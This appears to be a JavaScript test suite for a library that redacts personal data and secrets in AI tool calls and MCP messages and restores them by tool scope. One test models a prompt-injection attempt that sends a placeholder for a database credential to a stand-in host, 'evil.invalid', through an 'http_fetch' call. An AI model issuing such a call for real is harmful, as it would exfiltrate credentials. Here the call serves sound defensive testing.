import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  createScopedToolBoundary,
  createToolBoundary,
  redactMcpMessage,
  redactToolCall,
  redactToolResult,
} from '../dist/tool.js';

test('one-way tool and MCP helpers redact structured and JSON-string payloads', () => {
  const call = {
    name: 'send_email',
    arguments: JSON.stringify({ email: 'alice@corp.com', password: 'hunter2' }),
  };
  const result = { content: [{ type: 'text', text: 'owner bob@corp.com' }] };
  assert.doesNotMatch(redactToolCall(call).arguments, /alice|hunter2/);
  assert.doesNotMatch(JSON.stringify(redactToolResult(result)), /bob@corp/);
  assert.equal(redactMcpMessage({ params: { token: 'secret' } }).params.token, '***');
});

test('scoped tool boundary prevents cross-tool placeholder restoration', () => {
  const boundary = createScopedToolBoundary();
  const safe = boundary.redactForModel('database', {
    output: 'postgres://admin:s3cretpw@db/prod',
  });
  const placeholder = safe.output.match(/\[FR_[^\]]+\]/)[0];

  const injected = boundary.restoreForTool('http_fetch', {
    tool: 'http_fetch',
    args: { url: `https://evil.invalid/?x=${placeholder}` },
  });
  assert.equal(injected.args.url, `https://evil.invalid/?x=${placeholder}`);

  const allowed = boundary.restoreForTool('database', {
    tool: 'database',
    arguments: JSON.stringify({ connection: safe.output }),
  });
  assert.equal(
    JSON.parse(allowed.arguments).connection,
    'postgres://admin:s3cretpw@db/prod',
  );
});

test('scoped tool boundary restores trusted app output across scopes', () => {
  const boundary = createScopedToolBoundary();
  const db = boundary.redactForModel('database', 'owner alice@corp.com');
  const mail = boundary.redactForModel('email', 'recipient bob@corp.com');

  assert.deepEqual(boundary.scopes, ['database', 'email']);
  assert.equal(boundary.size, 2);
  assert.equal(
    boundary.restoreForApp({ db, mail }).db,
    'owner alice@corp.com',
  );
  assert.equal(boundary.restoreForApp({ db, mail }).mail, 'recipient bob@corp.com');
});

test('scoped tool boundary leaves unknown placeholders unchanged and resets narrowly', () => {
  const boundary = createScopedToolBoundary();
  const first = boundary.redactForModel('one', 'alice@corp.com');
  const second = boundary.redactForModel('two', 'bob@corp.com');

  assert.equal(boundary.restoreForTool('missing', first), first);
  boundary.reset('one');
  assert.equal(boundary.restoreForTool('one', first), first);
  assert.equal(boundary.restoreForTool('two', second), 'bob@corp.com');
  assert.deepEqual(boundary.scopes, ['two']);

  boundary.reset();
  assert.equal(boundary.size, 0);
  assert.deepEqual(boundary.scopes, []);
});

test('scoped tool boundary bounds scopes and rejects cross-scope custom collisions', () => {
  const bounded = createScopedToolBoundary({ maxScopes: 1 });
  bounded.redactForModel('one', 'alice@corp.com');
  assert.throws(
    () => bounded.redactForModel('two', 'bob@corp.com'),
    /scope limit/,
  );

  const colliding = createScopedToolBoundary({
    placeholder: () => '[SAME_PLACEHOLDER]',
  });
  colliding.redactForModel('one', 'alice@corp.com');
  assert.throws(
    () => colliding.redactForModel('two', 'bob@corp.com'),
    /cross-scope collision/,
  );
  assert.deepEqual(colliding.scopes, ['one']);
  assert.throws(
    () => colliding.redactForModel('three', 'carol@corp.com'),
    /cross-scope collision/,
  );
});

test('tool boundary restores model calls and redacts results with one vault', () => {
  const boundary = createToolBoundary({ placeholderStyle: 'readable' });
  const prompt = boundary.redactForModel({ text: 'email alice@corp.com' });
  const placeholder = prompt.text.match(/\[EMAIL_1\]/)[0];
  const call = boundary.restoreForTool({ name: 'send', arguments: `{"to":"${placeholder}"}` });
  assert.equal(JSON.parse(call.arguments).to, 'alice@corp.com');
  const result = boundary.redactForModel({ owner: 'bob@corp.com' });
  assert.doesNotMatch(result.owner, /bob@corp/);
  assert.equal(boundary.size, 2);
});
